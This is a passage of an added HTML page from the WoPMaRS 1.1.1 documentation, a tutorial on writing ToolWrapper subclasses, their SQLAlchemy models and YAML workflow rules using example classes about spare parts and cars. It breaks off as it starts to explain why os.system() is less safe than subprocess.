@@ -1,0 +1,405 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>ToolWrapper development &mdash; WoPMaRS 1.1.1 documentation</title>
+    
+    <link rel="stylesheet" href="_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    './',
+        VERSION:     '1.1.1',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="_static/jquery.js"></script>
+    <script type="text/javascript" src="_static/underscore.js"></script>
+    <script type="text/javascript" src="_static/doctools.js"></script>
+    <link rel="top" title="WoPMaRS 1.1.1 documentation" href="index.html" />
+    <link rel="next" title="Software Documentation" href="dev_wop.html" />
+    <link rel="prev" title="Usage" href="use.html" />
+   
+  <link rel="stylesheet" href="_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head>
+  <body role="document">
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
+            
+  <div class="section" id="toolwrapper-development">
+<h1>ToolWrapper development<a class="headerlink" href="#toolwrapper-development" title="Permalink to this headline">¶</a></h1>
+<p>This manual aims to explain with simple words how to write the <cite>Toolwrappers</cite> in order to allow a fresh Python developer to configure his own analysis workflow. This manual refers to the <a class="reference internal" href="use.html"><span class="doc">User Manual</span></a> so I recommand you to keep it open in case of blackout.</p>
+<p>This starting guide will allow you to understand the main mecanisms which rule <strong>WoPMaRS</strong>. It means the way WoPMaRS talks with the <cite>Toolwrappers</cite> you are using to understand their role in the workflow in terms of input and output parameters.</p>
+<p>To illustrate the necessary conditions to build a correct <cite>Toolwrapper</cite>, we will use some kind of <em>TO DO</em> task list to prevent forgetting steps. The order doesn't matter but, I insist, each step is essential.</p>
+<div class="section" id="developing-basic-toolwrappers">
+<h2>Developing basic <cite>Toolwrappers</cite><a class="headerlink" href="#developing-basic-toolwrappers" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="declaring-your-class">
+<h3>Declaring your class<a class="headerlink" href="#declaring-your-class" title="Permalink to this headline">¶</a></h3>
+<p>To define a <cite>Toolwrapper</cite> we will use an important concept of the <em>Object Oriented Programming</em> (OOP) which is <strong>abstract inheritance</strong>.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">An abstract class is a class which represent a concept and, consequently, which is not supposed to be instantiated. For example, the bird concept: a bird flies and sings: an abstract class <code class="docutils literal"><span class="pre">Bird</span></code> would have methods like <code class="docutils literal"><span class="pre">fly</span></code> and  <code class="docutils literal"><span class="pre">sing</span></code> with nothing inside. Actually, there are no species called &quot;bird&quot;, however, there are ducks and eagles. A duck is a realization of the concept of &quot;bird&quot;. In OOP, the class <code class="docutils literal"><span class="pre">Duck</span></code> would inherit from <code class="docutils literal"><span class="pre">Bird</span></code> and would overide the methods <code class="docutils literal"><span class="pre">fly</span></code> and <code class="docutils literal"><span class="pre">sing</span></code> to specialize them in order to fit with the duck characteristics. Here, <code class="docutils literal"><span class="pre">Duck</span></code> is a subclass of <code class="docutils literal"><span class="pre">Bird</span></code>.</p>
+</div>
+<p>A <cite>Toolwrapper</cite> compatible with <strong>WoPMaRS</strong> have to be a subclass of the abstract class, prepare yourself, <code class="docutils literal"><span class="pre">Toolwrapper</span></code>! For WoPMaRS, every <cite>Toolwrapper</cite> is a subclass of <code class="docutils literal"><span class="pre">Toolwrapper</span></code> and if you ask it to work with a class which do not satisfy this simple condition, you'll obtain an error. The reason for that is simple: if your <cite>Toolwrapper</cite> inherit from <code class="docutils literal"><span class="pre">Toolwrapper</span></code>, then it is certain that it contains some methods and attributes familiar to WoPMaRS. Otherwise, there are no guarantees.</p>
+<p>An other important thing necessary to work with WoPMaRS is to provide the static class attribute <code class="docutils literal"><span class="pre">__mapper_args__</span></code> to your <cite>Toolwrapper</cite>. This attribute is a dictionnary which should have <code class="docutils literal"><span class="pre">polymorphic_identity</span></code> as key and the full name of the class (contained in a String) as value. This information is necessary to WoPMaRS because when it will store the <cite>Toolwrappers</cite> informations into the database, WoPMaRS will be able to keep track of the inheritance between your <cite>Toolwrapper</cite> and the <code class="docutils literal"><span class="pre">Toolwrapper</span></code> class.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">A static class attribute is an attribute associated with a class and not with a specific object of this class. Modifying this kind of attribute in an object of a given class is somehow similar to modifying this attribute in every object of the class (those that already exist and those future).</p>
+</div>
+<p>Here is an example of the declaration of a class called <code class="docutils literal"><span class="pre">SparePartsManufacturer</span></code>:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">wopmars.main.tagc.framework.bdd.tables.ToolWrapper</span> <span class="kn">import</span> <span class="n">ToolWrapper</span>
+
+
+<span class="k">class</span> <span class="nc">SparePartsManufacturer</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.SparePartsManufacturer&quot;</span>
+    <span class="p">}</span>
+    <span class="k">pass</span>
+</pre></div>
+</div>
+<p>You have now created your first <cite>Toolwrapper</cite>, but the aims to use abstract class inheritance is to guarantee to <strong>WoPMaRS</strong> that each <code class="docutils literal"><span class="pre">Toolwrapper</span></code> implements some methods which describe its role.</p>
+<div class="section" id="toolwrapper-specifying-methods">
+<h4><cite>Toolwrapper</cite> specifying methods<a class="headerlink" href="#toolwrapper-specifying-methods" title="Permalink to this headline">¶</a></h4>
+<p>A good way to see a <cite>Toolwrapper</cite> is to see it as an independant software. Meaning that it has a well defined role which is to generate a specific output in terms of a specific kinf of input with some options to parametrize its behavior. Anyway, this is the way WoPMaRS is &quot;watching&quot; to the <cite>Toolwrappers</cite>. The link between a <cite>Toolwrapper</cite> and WoPMaRS is done thanks to inherited methods from <code class="docutils literal"><span class="pre">Toolwrapper</span></code> which have to be re-wrote by the <cite>Toolwrapper</cite> developer.</p>
+<div class="section" id="describing-files-specify-input-file-and-specif-output-file">
+<h5>Describing files: <code class="docutils literal"><span class="pre">specify_input_file</span></code> and <code class="docutils literal"><span class="pre">specif_output_file</span></code><a class="headerlink" href="#describing-files-specify-input-file-and-specif-output-file" title="Permalink to this headline">¶</a></h5>
+<p>The files called <em>input files</em> and <em>output files</em> are, on the one hand, the necessary files for the tool to work and, on the other hand, the files generated by the tool. A <cite>Toolwrapper</cite> doesn't rely on a specific file on the machine: it shouldn't access a file in a hard-coded way but should use some kind of variable containing the path to the given file. It is for the <cite>Toolwrapper</cite> developer to specify those variable names and they have to be respected in the workflow definition file (see <a class="reference internal" href="use.html"><span class="doc">User Manual</span></a>). Those variable names are known by WoPMaRS thanks to the methods <code class="docutils literal"><span class="pre">specify_input_file</span></code> (for the variable names associated with inputs) and <code class="docutils literal"><span class="pre">specify_output_file</span></code> (for the variable names associated with outputs). Those methods have to return each one a list containing the Strings containing the variable names accepted by the <cite>Toolwrapper</cite>.</p>
+<div class="admonition warning">
+<p class="first admonition-title">Warning</p>
+<p class="last">Every files asked by a <cite>Toolwrapper</cite> are required. It means that the processing of the <cite>Toolwrapper</cite> rely on every asked inputs and outputs. If a file is optional, you should specify it in the method <code class="docutils literal"><span class="pre">specify_params</span></code> (we will see it later)</p>
+</div>
+<p>The class <code class="docutils literal"><span class="pre">SparePartsManufacturer</span></code> takes a file in input but doesn't produce any output file. The input file path will be contained in the field named &quot;pieces&quot;.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">SparePartsManufacturer</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.SparePartsManufacturer&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">specify_input_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;pieces&quot;</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="describing-tables-specify-input-table-and-specify-output-table">
+<h5>Describing tables: <code class="docutils literal"><span class="pre">specify_input_table</span></code> and <code class="docutils literal"><span class="pre">specify_output_table</span></code><a class="headerlink" href="#describing-tables-specify-input-table-and-specify-output-table" title="Permalink to this headline">¶</a></h5>
+<p><strong>WoPMaRS</strong> makes its <cite>Toolwrapper</cite> able to read and write entries in a database. Like for the files, the <cite>Toolwrappers</cite> have to specify in which table of the database they will read (input tables) and in which they will write (output tables). So, the <code class="docutils literal"><span class="pre">Toolwrapper</span></code> class implements the methods <code class="docutils literal"><span class="pre">specify_input_table</span></code> and <code class="docutils literal"><span class="pre">specify_output_table</span></code>. However, this time, the Strings contained in the returned list are associated with both the variables containing the table models and the name of the tables itself.</p>
+<p>The final user have to write the same table names as keys in the <cite>table</cite> part of the definition file (see <a class="reference internal" href="use.html"><span class="doc">User Manual</span></a>) and the path to the models associated with those tables as the values to specify which one the <cite>Toolwrapper</cite> should use. Usually, a <cite>Toolwrapper</cite> is closely related to a specific model but we can imagine that if two models are similar for a given <cite>Toolwrapper</cite>, it could use one or the other independantly (for example, if a model B inherit from the model A, then every <cite>Toolwrapper</cite> able to use A should be able to use B too).</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">At the moment, the concept of model shouldn't be clear but don't worry, in the section concerning the models, you will get more explanations about those models. At the moment, simply note that the <cite>Toolwrapper</cite> communicate its input and output table names in the methods <code class="docutils literal"><span class="pre">specify_input_table</span></code> and <code class="docutils literal"><span class="pre">specify_output_table</span></code>.</p>
+</div>
+<p>Here is the rest of the <cite>Toolwrapper</cite> <code class="docutils literal"><span class="pre">SparePartsManufacturer</span></code> which writes its results in the table <code class="docutils literal"><span class="pre">piece</span></code>:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">SparePartsManufacturer</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.SparePartsManufacturer&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">specify_input_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;pieces&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_output_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece&quot;</span><span class="p">]</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="describing-paramaters-specify-params">
+<h5>Describing paramaters: <code class="docutils literal"><span class="pre">specify_params</span></code><a class="headerlink" href="#describing-paramaters-specify-params" title="Permalink to this headline">¶</a></h5>
+<p>An other feature offered by the <cite>Toolwrappers</cite> is to allow you to specify some parameters for the processing of the wrapper. Usually, those parameters will be associated with the options allowed by the analysis tool itself. They may also correspond to options used by the <cite>toolwrappers</cite> to offer flexibility for the pre and post processing of the data.</p>
+<p>To specify which options a <cite>Toolwrapper</cite> is able to understand, it implements a method <code class="docutils literal"><span class="pre">specify_params</span></code>. This method returns a dictionnary in which each key correspond to the name of the option which will be used in the definition file (see <a class="reference internal" href="use.html"><span class="doc">User Manual</span></a>) and each value, a String representing its type. The availables types are the following (to memorize them, just think about the different Python data types):
+- <code class="docutils literal"><span class="pre">int</span></code>
+- <code class="docutils literal"><span class="pre">float</span></code>
+- <code class="docutils literal"><span class="pre">str</span></code>
+- <code class="docutils literal"><span class="pre">bool</span></code></p>
+<p>Furthermore, the key word <code class="docutils literal"><span class="pre">required</span></code> is available and allows to specify that one option has to be given by the user for the tool to run. To specify the type and use <code class="docutils literal"><span class="pre">required</span></code> at the same time, the character <code class="docutils literal"><span class="pre">|</span></code> will be used as a delimiter inside the String.</p>
+<p>In the following class, the parameter <code class="docutils literal"><span class="pre">max_price</span></code> is an <code class="docutils literal"><span class="pre">int</span></code> and will be used to get only the entries with a price lower than it, if set.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">SparePartsManufacturer</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.SparePartsManufacturer&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">specify_input_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;pieces&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_output_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_params</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;max_price&quot;</span><span class="p">:</span> <span class="nb">int</span>
+        <span class="p">}</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="declaring-the-method-run">
+<h4>Declaring the method <code class="docutils literal"><span class="pre">run</span></code><a class="headerlink" href="#declaring-the-method-run" title="Permalink to this headline">¶</a></h4>
+<p>The <code class="docutils literal"><span class="pre">run</span></code> method contains the core of your <cite>Toolwrapper</cite>. The data processing and the call to the underlying analysis tool will be done here.</p>
+<div class="section" id="calling-files-self-input-file-and-self-output-file">
+<h5>Calling files: <code class="docutils literal"><span class="pre">self.input_file</span></code> and <code class="docutils literal"><span class="pre">self.output_file</span></code><a class="headerlink" href="#calling-files-self-input-file-and-self-output-file" title="Permalink to this headline">¶</a></h5>
+<p>The path to the files given by the final user are manipulated thanks to the methods <code class="docutils literal"><span class="pre">self.input_file</span></code> and <code class="docutils literal"><span class="pre">self.output_file</span></code> with the name of the variable containing the desired file as argument. For example, in our definition file, we have:</p>
+<div class="highlight-yaml"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">rule Rule1</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">tool</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.wrappers.SparePartsManufacturer&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">input</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">file</span><span class="p p-Indicator">:</span>
+            <span class="l l-Scalar l-Scalar-Plain">pieces</span><span class="p p-Indicator">:</span> <span class="s">&#39;input/pieces.txt&#39;</span>
+</pre></div>
+</div>
+<p>We can access the string <cite>input/pieces.txt</cite> with the following statement:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">input_file</span><span class="p">(</span><span class="s2">&quot;pieces&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="calling-models-self-input-table-and-self-output-table">
+<h5>Calling models: <code class="docutils literal"><span class="pre">self.input_table</span></code> and <code class="docutils literal"><span class="pre">self.output_table</span></code><a class="headerlink" href="#calling-models-self-input-table-and-self-output-table" title="Permalink to this headline">¶</a></h5>
+<p>The models given by the user can be accessed thanks to the methodes <code class="docutils literal"><span class="pre">self.input_table</span></code> and <code class="docutils literal"><span class="pre">self.output_table</span></code> with the table name as argument. This way, and unlike the files, you won't get the string representing the model but the model itself. For example:</p>
+<div class="highlight-yaml"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">output</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">table</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">piece</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.models.Piece&#39;</span>
+</pre></div>
+</div>
+<p>We can access the model <code class="docutils literal"><span class="pre">Piece</span></code> with the following statement:</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="bp">self</span><span class="o">.</span><span class="n">output_table</span><span class="p">(</span><span class="s2">&quot;piece&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="declaring-a-model">
+<h3>Declaring a model<a class="headerlink" href="#declaring-a-model" title="Permalink to this headline">¶</a></h3>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">A data model is an abstract representation of data. In the field of the OOP and the work with a relational database, we can consider a model like a class which represent a data type in the database (usually a row in a table). The model have to describe the types of each field and their relations with the other tables (meanning other models).</p>
+</div>
+<p>For the rest of this section, I assume that you have read and understood the secion <a class="reference external" href="http://docs.sqlalchemy.org/en/latest/orm/tutorial.html#declare-a-mapping">&quot;Declare a Mapping&quot;</a> of the SQLAlchemy tutorial.</p>
+<p>A model have to be associated with a database. This is why the models used in WoPMaRS have to inherit from the class <code class="docutils literal"><span class="pre">Base</span></code>. <code class="docutils literal"><span class="pre">Base</span></code> is a class which will be associated itself with a SQLite database (a file) and which contains every information related: the tables, the relations, etc..</p>
+<p>To declare a model, even before specifying fiels, it is necessary that you give a name to the table thanks to the static attribute <code class="docutils literal"><span class="pre">__tablename__</span></code>. the content of this variable is extremely important because this is the name which will be returned by the methods <code class="docutils literal"><span class="pre">specify_input_table</span></code> and <code class="docutils literal"><span class="pre">specify_output_table</span></code> of your <cite>Toolwrappers</cite> and which will be used by the final user to referencing the table in the definition file.</p>
+<p>Most of the functionnalities described in the SQLAlchemy tutorial are also available in WoPMaRS models, especially the foreign key and relationship system between models. If ever, you find a missing functionnality, do not hesitate and send us an issue. This is also important to notive that the foreign key constraints have been enforced for WoPMaRS, meaning that if you do not respect those constraints in your <cite>Toolwrapper</cite>, you'll get an error.</p>
+</div>
+</div>
+<div class="section" id="developing-advanced-toolwrappers">
+<h2>Developing Advanced <cite>Toolwrappers</cite><a class="headerlink" href="#developing-advanced-toolwrappers" title="Permalink to this headline">¶</a></h2>
+<p>Now that you understand the basics of the development of the <cite>Toolwrappers</cite> you may want to do more advanced tricks to deal with <strong>WoPMaRS</strong>.</p>
+<div class="section" id="parametrize-inputs-and-outputs">
+<h3>Parametrize inputs and outputs<a class="headerlink" href="#parametrize-inputs-and-outputs" title="Permalink to this headline">¶</a></h3>
+<p>During the parsing of the configuration file, WoPMaRS check first the validity of the parameters and then look at the inputs and outputs. This behavior allow you to parametrize which input and output your <cite>Toolwrapper</cite> is supposed to take depending on the used parameters. In this example, the parameter <code class="docutils literal"><span class="pre">to_file</span></code> is a <code class="docutils literal"><span class="pre">boolean</span></code> and if it is <code class="docutils literal"><span class="pre">True</span></code>, the result is written in a file instead of the database.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">CarAssembler</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.CarAssembler&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">specify_output_file</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">option</span><span class="p">(</span><span class="s2">&quot;to_file&quot;</span><span class="p">):</span>
+            <span class="k">return</span> <span class="p">[]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece_car&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_input_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_output_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">option</span><span class="p">(</span><span class="s2">&quot;to_file&quot;</span><span class="p">):</span>
+            <span class="k">return</span> <span class="p">[]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece_car&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_params</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">{</span>
+            <span class="s2">&quot;to_file&quot;</span><span class="p">:</span> <span class="s2">&quot;bool&quot;</span><span class="p">,</span>
+            <span class="s2">&quot;max_price&quot;</span><span class="p">:</span> <span class="s2">&quot;int&quot;</span><span class="p">,</span>
+        <span class="p">}</span>
+</pre></div>
+</div>
+<p>And there, the definition file (<code class="docutils literal"><span class="pre">Wopfile2</span></code> in the example directory) look like this:</p>
+<div class="highlight-yaml"><div class="highlight"><pre><span></span><span class="c1"># Rule1 use SparePartsManufacturer to insert pieces informations into the table piece</span>
+<span class="l l-Scalar l-Scalar-Plain">rule Rule1</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">tool</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.wrappers.SparePartsManufacturer&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">input</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">file</span><span class="p p-Indicator">:</span>
+            <span class="l l-Scalar l-Scalar-Plain">pieces</span><span class="p p-Indicator">:</span> <span class="s">&#39;input/pieces.txt&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">output</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">table</span><span class="p p-Indicator">:</span>
+            <span class="l l-Scalar l-Scalar-Plain">piece</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.models.Piece&#39;</span>
+
+<span class="c1"># CarAssembler make the combinations of all possible pieces to build cars and calculate the final price</span>
+<span class="l l-Scalar l-Scalar-Plain">rule Rule2</span><span class="p p-Indicator">:</span>
+    <span class="l l-Scalar l-Scalar-Plain">tool</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.wrappers.CarAssembler&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">input</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">table</span><span class="p p-Indicator">:</span>
+            <span class="l l-Scalar l-Scalar-Plain">piece</span><span class="p p-Indicator">:</span> <span class="s">&#39;wopexample.models.Piece&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">output</span><span class="p p-Indicator">:</span>
+        <span class="c1"># Here the output is written in a file</span>
+        <span class="l l-Scalar l-Scalar-Plain">file</span><span class="p p-Indicator">:</span>
+            <span class="l l-Scalar l-Scalar-Plain">piece_car</span><span class="p p-Indicator">:</span> <span class="s">&#39;output/piece_car.txt&#39;</span>
+    <span class="l l-Scalar l-Scalar-Plain">params</span><span class="p p-Indicator">:</span>
+        <span class="c1"># The price have to be under 2000!</span>
+        <span class="l l-Scalar l-Scalar-Plain">max_price</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">2000</span>
+        <span class="l l-Scalar l-Scalar-Plain">to_file</span><span class="p p-Indicator">:</span> <span class="l l-Scalar l-Scalar-Plain">True</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="inherit-models">
+<h3>Inherit models<a class="headerlink" href="#inherit-models" title="Permalink to this headline">¶</a></h3>
+<p>During the conception of your workflows, you may want to make multiple rules write in the same table in a specific order (for example, one rule create entries and the other add informations in the fields). Basically, you would do like ever, playing with inputs and outputs in order to fit your needs but this way, you will be stuck with a logic problem where WoPMaRS won't be able to say &quot;this rule should be run before this one&quot;, like in the following schema:</p>
+<div class="figure align-center" id="id1">
+<img alt="_images/model_inheritance.png" src="_images/model_inheritance.png" />
+<p class="caption"><span class="caption-text"><em>If you want the rules to be run in this specific order, WoPMaRS can't understand if `rule 2` is supposed to run before `rule 4` on the basis of the table names</em></span></p>
+</div>
+<p>You can bypass this issue using <em>model inheritance</em>. With the model inheritance, you can build a model which inherit from a former model and add it some new attributes.</p>
+<p>Taking back our model example <code class="docutils literal"><span class="pre">Piece</span></code>, we need an other model which add the field <code class="docutils literal"><span class="pre">date</span></code> to the table. We call this model <code class="docutils literal"><span class="pre">DatedPiece</span></code></p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">sqlalchemy.sql.sqltypes</span> <span class="kn">import</span> <span class="n">Date</span>
+<span class="kn">from</span> <span class="nn">sqlalchemy</span> <span class="kn">import</span> <span class="n">Column</span>
+
+<span class="kn">from</span> <span class="nn">wopexample.models.Piece</span> <span class="kn">import</span> <span class="n">Piece</span>
+
+
+<span class="k">class</span> <span class="nc">DatedPiece</span><span class="p">(</span><span class="n">Piece</span><span class="p">):</span>
+    <span class="n">date</span> <span class="o">=</span> <span class="n">Column</span><span class="p">(</span><span class="n">Date</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>With this model, there is an other <cite>Toolwrapper</cite> provided in the example: <code class="docutils literal"><span class="pre">AddDateTopiece</span></code> which show use of the same table as input and output. You can note that here, the <cite>output_table</cite> only is used. Actually, we are interested here in only <code class="docutils literal"><span class="pre">DatedPiece</span></code> objects:</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">datetime</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="kn">from</span> <span class="nn">wopmars.main.tagc.framework.bdd.tables.ToolWrapper</span> <span class="kn">import</span> <span class="n">ToolWrapper</span>
+
+
+<span class="k">class</span> <span class="nc">AddDateToPiece</span><span class="p">(</span><span class="n">ToolWrapper</span><span class="p">):</span>
+    <span class="n">__mapper_args__</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&quot;polymorphic_identity&quot;</span><span class="p">:</span> <span class="s2">&quot;wopmars.example.AddDateToPiece&quot;</span>
+    <span class="p">}</span>
+
+    <span class="k">def</span> <span class="nf">specify_input_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">specify_output_table</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">[</span><span class="s2">&quot;piece&quot;</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">session</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+        <span class="n">DatedPiece</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">output_table</span><span class="p">(</span><span class="s2">&quot;piece&quot;</span><span class="p">)</span>
+
+        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="p">()</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">DatedPiece</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">():</span>
+            <span class="n">date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1000000</span><span class="p">,</span> <span class="mi">100000000</span><span class="p">))</span>
+            <span class="n">p</span><span class="o">.</span><span class="n">date</span> <span class="o">=</span> <span class="n">date</span>
+            <span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="executing-clean-command-line">
+<h3>Executing clean command line<a class="headerlink" href="#executing-clean-command-line" title="Permalink to this headline">¶</a></h3>
+<p>In your learning of Python, you may have encountered the famous <code class="docutils literal"><span class="pre">os.system(&quot;command-line&quot;)</span></code> and you probably want to make use of it again. Sorry, you <strong>shouldn't do</strong> things this way. Especially if you are running long analysis software. Instead, I'll show you how to use the module <a class="reference external" href="https://docs.python.org/3/library/subprocess.html">subprocess</a> for simple things and, please, use it extensively in order to get more control on the command lines you are executing.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p>As far as I know, there is two main differences between <code class="docutils literal"><span class="pre">os.system()</span></code> and <code class="docutils literal"><span class="pre">subprocess</span></code> plus the fact that <code class="docutils literal"><span class="pre">subprocess</span></code> is actually a little more difficult to use than the former:</p>
+<ul class="last">
+<li><p class="first"><code class="docutils literal"><span class="pre">os.system()</span></code> is very sensible to malicious code injection. Example:</p>
+<blockquote>
